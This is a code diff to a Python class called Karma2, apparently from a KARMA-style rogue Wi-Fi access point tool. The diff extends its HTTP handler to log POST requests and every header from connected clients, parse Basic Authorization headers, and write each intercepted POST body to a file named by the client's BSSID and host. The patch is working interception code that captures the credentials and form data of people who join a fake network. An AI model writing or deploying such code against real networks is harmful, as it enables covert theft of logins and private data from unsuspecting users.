@@ -201,7 +201,7 @@ class Karma2:
       protocol = _ctxt(self.server.PRE,BLUE)
       if self.server.PRE == 'HTTPS':
         protocol = _ctxt(self.server.PRE,RED)
-      log( "%s %s: %s => %s"%(essid,protocol,client,fullpath) )
+      log( "%s %s GET: %s => %s"%(essid,protocol,client,fullpath) )
       for k in self.headers:
         log( "%s> %s:%s"%(_ctxt(" |\\--",BLUE),k,self.headers.get(k)) )
       
@@ -252,8 +252,20 @@ class Karma2:
       client = self.client_address[0]
       path,params,args = self._parse_url()
       host = self.headers.get('Host')
-      fullpath =  "%s%s"%(host,path)
-      log( "%s => %s"%(client,fullpath) )
+      fullpath =  "%s/%s"%(host,path)
+      
+      essid = ""
+      try:
+        essid = self.server.app.get_client_ap(client).essid
+      except:
+        pass
+      protocol = _ctxt(self.server.PRE,BLUE)
+      if self.server.PRE == 'HTTPS':
+        protocol = _ctxt(self.server.PRE,RED)
+      log( "%s %s POST: %s => %s"%(essid,protocol,client,fullpath) )
+      for k in self.headers:
+        log( "%s> %s:%s"%(_ctxt(" |\\--",BLUE),k,self.headers.get(k)) )
+      
       try:
         authorization = self.headers.get('Authorization').split(' ')
         if authorization[0] == 'Basic':
@@ -270,7 +282,18 @@ class Karma2:
         country = self.headers.get('country')
         log( "%s is using a %s %s using %s. Language is %s"%(client, brand, model, operator, lang))
         
-        
+      #save content
+      length = int(self.headers['Content-Length'])
+      if length > 0:
+        post = self.rfile.read(length)
+        post = post.decode('string-escape').strip('"')
+        bssid = self.server.app.get_client_bssid(client)
+        name = "%s_%s"%(bssid,host)
+        f = open(name,'w')
+        f.write(post)
+        f.close()
+        log( "[+] %s from %s to %s (%s)"%(_ctxt("saved post request",GREEN), client, fullpath, name))
+      
       self.send_response(200)
       self.end_headers()
       
